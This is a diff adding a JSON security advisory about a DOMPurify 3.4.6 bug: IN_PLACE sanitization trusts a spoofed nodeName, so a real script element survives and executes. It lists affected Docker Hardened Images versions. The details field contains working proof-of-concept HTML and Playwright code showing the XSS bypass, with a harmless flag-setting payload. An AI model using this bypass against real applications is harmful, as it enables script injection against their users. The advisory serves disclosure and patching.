@@ -1,0 +1,304 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-wjnr-c2rl-7xe4-ynkz",
+  "modified": "2026-09-21T18:09:38Z",
+  "published": "2026-09-21T18:09:38Z",
+  "upstream": [
+    "CVE-2026-65901"
+  ],
+  "summary": "## Summary",
+  "details": "## Summary\n\nWhen `DOMPurify.sanitize(root, { IN_PLACE: true })` is called on an attacker-supplied live DOM node, `DOMPurify` still trusts `currentNode.nodeName` for non-`form` nodes in the main `_sanitizeElements` pipeline. A real `<script>` child node whose observable `nodeName` is attacker-controlled can therefore be misclassified as an allowed element and retained. When the sanitized tree is inserted into a live document, the script executes.\n\nThis affects current `3.4.6`. The recent `IN_PLACE` hardening work covers clobbered `form` handling and foreign-realm shadow/template traversal, but does not harden the main per-node element decision for hostile non-`form` live nodes.\n\n## Affected\n\n- DOMPurify `3.4.6`\n- Any caller that does `DOMPurify.sanitize(node, { IN_PLACE: true })` on attacker-supplied live DOM nodes\n- Verified attacker-controlled node sources:\n  - same-origin `iframe` → live node passed by reference\n  - same-origin `window.open()` popup → live node passed by reference\n  - same-origin foreign node adopted into the host document via `document.adoptNode(node)` and then sanitized in-place\n\nNot affected:\n\n- String-input `DOMPurify.sanitize(dirtyString)`\n\n## Vulnerability details\n\n### Code paths\n\n[A] — `_sanitizeElements` uses the instance-visible `nodeName` for the allow/forbid decision:\n\n```ts\nconst _sanitizeElements = function (currentNode: any): boolean {\n  ...\n  if (_isClobbered(currentNode)) {\n    _forceRemove(currentNode);\n    return true;\n  }\n\n  const tagName = transformCaseFunc(currentNode.nodeName);\n  ...\n  if (\n    FORBID_TAGS[tagName] ||\n    (!(...) && !ALLOWED_TAGS[tagName])\n  ) {\n    ...\n    _forceRemove(currentNode);\n    return true;\n  }\n  ...\n};\n```\n\nFor non-`form` nodes, `_isClobbered(currentNode)` returns `false` early. The subsequent element decision therefore trusts `currentNode.nodeName` directly.\n\n[B] — `_isClobbered` is `form`-specific:\n\n```ts\nconst _isClobbered = function (element: Element): boolean {\n  const realTagName = getNodeName ? getNodeName(element) : null;\n  if (typeof realTagName !== 'string') {\n    return false;\n  }\n\n  if (transformCaseFunc(realTagName) !== 'form') {\n    return false;\n  }\n\n  return (...);\n};\n```\n\nThe hardening is intentionally scoped to `form`. Non-`form` nodes are not checked for divergence between the instance-visible property view and the trusted prototype getter view.\n\n### Why the bypass works\n\nThe attack does **not** depend on string HTML parsing. It depends on a hostile live DOM object crossing a trust boundary into `DOMPurify`'s `IN_PLACE` pipeline.\n\nIf the attacker controls a same-origin subcontext (`iframe` or popup), they can prepare a real DOM subtree there and then pass the live node object by reference to a host page that trusts `DOMPurify.sanitize(node, { IN_PLACE: true })` as its final sanitization step.\n\nFor the verified primitive below:\n\n- the real child node is `<script>`\n- its script text is attacker-controlled\n- the observable `nodeName` is attacker-controlled and made to appear as `\"DIV\"`\n- `_sanitizeElements` therefore classifies the real `<script>` child as an allowed element\n- the real `<script>` survives in the sanitized tree and executes on insertion\n\nThis primitive survives:\n\n- direct reference passing\n- `document.adoptNode(node)` followed by `IN_PLACE`\n\nIt does **not** survive:\n\n- `importNode`\n- `cloneNode`\n\nbecause those paths materialize a fresh node and discard the hostile object semantics.\n\n## Proof of concept\n\n### (1) Minimal — runnable in a single browser context\n\n```html\n<!doctype html>\n<html><body>\n<script src=\"dist/purify.js\"></script>\n<script>\n  const foreign = window.open('about:blank', '_blank', 'noopener=no');\n\n  const host = foreign.document.createElement('div');\n  const script = foreign.document.createElement('script');\n  script.textContent = 'window.__pwned = 1';\n  Object.defineProperty(script, 'nodeName', {\n    value: 'DIV',\n    configurable: true,\n  });\n  host.appendChild(script);\n\n  DOMPurify.sanitize(host, { IN_PLACE: true });\n\n  console.log('output:', host.outerHTML);\n  // <div><script>window.__pwned = 1</script></div>\n\n  window.__pwned = 0;\n  document.body.appendChild(host);\n  console.log('handler fired:', window.__pwned === 1); // true\n</script>\n</body></html>\n```\n\n### (2) End-to-end — Playwright\n\n```js\nconst { chromium } = require('playwright');\nconst path = require('path');\n\n(async () => {\n  const browser = await chromium.launch();\n  const page = await browser.newPage();\n  await page.goto('about:blank');\n  await page.addScriptTag({ path: path.resolve('dist/purify.js') });\n\n  const result = await page.evaluate(async () => {\n    window.__hits = [];\n\n    const foreign = window.open('about:blank', '_blank', 'noopener=no');\n    const host = foreign.document.createElement('div');\n    const script = foreign.document.createElement('script');\n    script.textContent = 'top.__hits.push(\"script-fired\")';\n    Object.defineProperty(script, 'nodeName', {\n      value: 'DIV',\n      configurable: true,\n    });\n    host.appendChild(script);\n\n    DOMPurify.sanitize(host, { IN_PLACE: true });\n    document.body.appendChild(host);\n\n    return {\n      version: DOMPurify.version,\n      output: host.outerHTML,\n      fired: window.__hits.includes('script-fired'),\n    };\n  });\n\n  console.log(result);\n  await browser.close();\n})();\n```\n\nObserved:\n\n- Chromium / Firefox / WebKit\n\n```js\n{\n  version: '3.4.6',\n  output: '<div><script>top.__hits.push(\"script-fired\")</script></div>',\n  fired: true\n}\n```\n\n## Impact\n\n### Direct\n\nXSS via retained real `<script>` nodes inside attacker-supplied live DOM objects.\n\nAny consumer that uses `DOMPurify.sanitize(node, { IN_PLACE: true })` as a security boundary for live DOM objects supplied by a lower-trust same-origin subcontext is vulnerable.\n\nThe typical pattern is:\n\n```js\n// attacker-controlled same-origin subcontext prepares a live node\nconst foreignNode = attackerFrame.contentWindow.makeNode();\n\n// host treats DOMPurify as the last security gate\nDOMPurify.sanitize(foreignNode, { IN_PLACE: true });\ncontainer.appendChild(foreignNode);\n```\n\nIf `foreignNode` is a hostile live DOM object whose real child is `<script>` but whose observable `nodeName` is attacker-controlled, the sanitized output still contains the real script node when re-inserted into the live document.\n\n### Indirect / second-order\n\n- Applications that accept same-origin plugin / extension / widget DOM and rely on `IN_PLACE` as the final sanitization step\n- Editor or design-tool architectures where lower-trust subcontexts submit live DOM subtrees to a higher-trust host for in-place sanitization\n\n## Suggested fix\n\nTwo minimal-risk options:\n\n1. Stop trusting instance-visible `nodeName` for the element decision in `IN_PLACE`.\n\nUse the cached prototype getter (or another trusted realm-safe primitive) for the allow/forbid decision, just as the recent hardening already does for selected root and shadow-root checks.\n\nIn other words, the main pipeline should not do:\n\n```ts\nconst tagName = transformCaseFunc(currentNode.nodeName);\n```\n\non hostile live objects.\n\n2. Generalize hostile-node detection beyond `form`.\n\nThe current `_isClobbered()` logic is `form`-specific. A more defensive approach would reject or strictly sanitize any `IN_PLACE` node whose instance-visible critical properties diverge from the trusted prototype getter view, at least for:\n\n- `nodeName`\n- `attributes`\n- `childNodes`\n\nEither approach would close the verified primitive above.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "alloy",
+        "purl": "pkg:docker/dhi/alloy?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.10.1-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "alloy",
+        "purl": "pkg:docker/dhi/alloy?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.10.1-debian13",
+        "1.11.0-debian13",
+        "1.11.2-debian13",
+        "1.11.3-debian13",
+        "1.12.0-debian13",
+        "1.12.0-debian13-dev",
+        "1.12.1-debian13",
+        "1.12.1-debian13-dev",
+        "1.12.2-debian13",
+        "1.12.2-debian13-dev",
+        "1.13.0-debian13",
+        "1.13.0-debian13-dev",
+        "1.13.1-debian13",
+        "1.13.1-debian13-dev",
+        "1.13.2-debian13",
+        "1.13.2-debian13-dev",
+        "1.13.2-debian13-fips",
+        "1.13.2-debian13-fips-dev",
+        "1.14.0-debian13",
+        "1.14.0-debian13-dev",
+        "1.14.0-debian13-fips",
+        "1.14.0-debian13-fips-dev",
+        "1.14.1-debian13",
+        "1.14.1-debian13-dev",
+        "1.14.1-debian13-fips",
+        "1.14.1-debian13-fips-dev",
+        "1.15.0-debian13",
+        "1.15.0-debian13-dev",
+        "1.15.0-debian13-fips",
+        "1.15.0-debian13-fips-dev",
+        "1.15.1-debian13",
+        "1.15.1-debian13-dev",
+        "1.15.1-debian13-fips",
+        "1.15.1-debian13-fips-dev",
+        "1.16.0-debian13",
+        "1.16.0-debian13-dev",
+        "1.16.0-debian13-fips",
+        "1.16.0-debian13-fips-dev",
+        "1.16.1-debian13",
+        "1.16.1-debian13-dev",
+        "1.16.1-debian13-fips",
+        "1.16.1-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "argocd",
+        "purl": "pkg:docker/dhi/argocd?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "2.14.20-debian13",
+        "2.14.21-debian13",
+        "3.0.13-debian13",
+        "3.0.15-debian13",
+        "3.0.16-debian13",
+        "3.0.17-debian13",
+        "3.0.18-debian13",
+        "3.0.19-debian13",
+        "3.0.20-debian13",
+        "3.0.20-debian13-fips",
+        "3.0.21-debian13",
+        "3.0.21-debian13-fips",
+        "3.0.22-debian13",
+        "3.0.22-debian13-fips",
+        "3.0.23-debian13",
+        "3.0.23-debian13-fips",
+        "3.1.1-debian13",
+        "3.1.10-debian13",
+        "3.1.10-debian13-fips",
+        "3.1.11-debian13",
+        "3.1.11-debian13-fips",
+        "3.1.12-debian13",
+        "3.1.12-debian13-fips",
+        "3.1.13-debian13",
+        "3.1.13-debian13-fips",
+        "3.1.14-debian13",
+        "3.1.14-debian13-fips",
+        "3.1.15-debian13",
+        "3.1.15-debian13-fips",
+        "3.1.16-debian13",
+        "3.1.16-debian13-fips",
+        "3.1.3-debian13",
+        "3.1.4-debian13",
+        "3.1.5-debian13",
+        "3.1.6-debian13",
+        "3.1.7-debian13",
+        "3.1.8-debian13",
+        "3.1.9-debian13",
+        "3.1.9-debian13-fips",
+        "3.2.0-debian13",
+        "3.2.1-debian13",
+        "3.2.1-debian13-fips",
+        "3.2.10-debian13",
+        "3.2.10-debian13-fips",
+        "3.2.11-debian13",
+        "3.2.11-debian13-fips",
+        "3.2.12-debian13",
+        "3.2.12-debian13-fips",
+        "3.2.2-debian13",
+        "3.2.2-debian13-fips",
+        "3.2.3-debian13",
+        "3.2.3-debian13-fips",
+        "3.2.4-debian13",
+        "3.2.4-debian13-fips",
+        "3.2.5-debian13",
+        "3.2.5-debian13-fips",
+        "3.2.6-debian13",
+        "3.2.6-debian13-fips",
+        "3.2.7-debian13",
+        "3.2.7-debian13-fips",
+        "3.2.8-debian13",
+        "3.2.8-debian13-fips",
+        "3.2.9-debian13",
+        "3.2.9-debian13-fips",
+        "3.3.10-debian13",
+        "3.3.10-debian13-fips",
+        "3.3.11-debian13",
+        "3.3.11-debian13-fips",
+        "3.3.12-debian13",
+        "3.3.12-debian13-fips",
+        "3.3.2-debian13",
+        "3.3.2-debian13-fips",
+        "3.3.3-debian13",
+        "3.3.3-debian13-fips",
+        "3.3.4-debian13",
+        "3.3.4-debian13-fips",
+        "3.3.5-debian13",
+        "3.3.5-debian13-fips",
+        "3.3.6-debian13",
+        "3.3.6-debian13-fips",
+        "3.3.7-debian13",
+        "3.3.7-debian13-fips",
+        "3.3.8-debian13",
+        "3.3.8-debian13-fips",
+        "3.3.9-debian13",
+        "3.3.9-debian13-fips",
+        "3.4.1-debian13",
+        "3.4.1-debian13-fips",
+        "3.4.2-debian13",
+        "3.4.2-debian13-fips",
+        "3.4.3-debian13",
+        "3.4.3-debian13-fips",
+        "3.4.4-debian13",
+        "3.4.4-debian13-fips"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "argocd",
+        "purl": "pkg:docker/dhi/argocd?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "3.1.0-debian12",
+        "3.1.1-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "grist",
+        "purl": "pkg:docker/dhi/grist?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.6.0-debian12",
+        "1.6.1-debian12",
+        "1.7.0-debian12",
+        "1.7.1-debian12",
+        "1.7.2-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "grist",
+        "purl": "pkg:docker/dhi/grist?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.7.10-debian13",
+        "1.7.10-debian13-dev",
+        "1.7.11-debian13",
+        "1.7.11-debian13-dev",
+        "1.7.12-debian13",
+        "1.7.12-debian13-dev",
+        "1.7.13-debian13",
+        "1.7.13-debian13-dev",
+        "1.7.15-debian13",
+        "1.7.15-debian13-dev",
+        "1.7.19-debian13",
+        "1.7.19-debian13-dev",
+        "1.7.2-debian13",
+        "1.7.3-debian13",
+        "1.7.4-debian13",
+        "1.7.5-debian13",
+        "1.7.7-debian13",
+        "1.7.8-debian13",
+        "1.7.8-debian13-dev",
+        "1.7.9-debian13",
+        "1.7.9-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kibana",
+        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "9.1.10-debian13",
+        "9.1.8-debian13",
+        "9.1.9-debian13",
+        "9.2.2-debian13",
+        "9.2.3-debian13",
+        "9.2.4-debian13",
+        "9.2.5-debian13",
+        "9.2.6-debian13",
+        "9.2.8-debian13",
+        "9.3.0-debian13",
+        "9.3.1-debian13",
+        "9.3.3-debian13",
+        "9.3.4-debian13",
+        "9.3.5-debian13",
+        "9.4.1-debian13",
+        "9.4.2-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-wjnr-c2rl-7xe4-ynkz"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-x4vx-rjvf-j5p4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/cure53/DOMPurify/security/advisories/GHSA-x4vx-rjvf-j5p4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-65901"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-65901"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-65901"
+    }
+  ]
+}
